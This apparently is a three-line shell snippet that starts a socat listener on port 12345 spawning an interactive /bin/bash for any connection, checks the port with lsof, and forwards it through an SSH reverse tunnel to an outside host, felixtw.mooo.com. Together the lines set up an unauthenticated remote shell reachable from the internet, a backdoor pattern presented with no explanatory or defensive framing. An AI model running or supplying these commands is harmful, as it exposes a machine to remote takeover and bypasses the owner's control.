socat TCP4-LISTEN:12345,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane&
lsof -i :12345
ssh -R 12345:localhost:12345 tunnel@felixtw.mooo.com
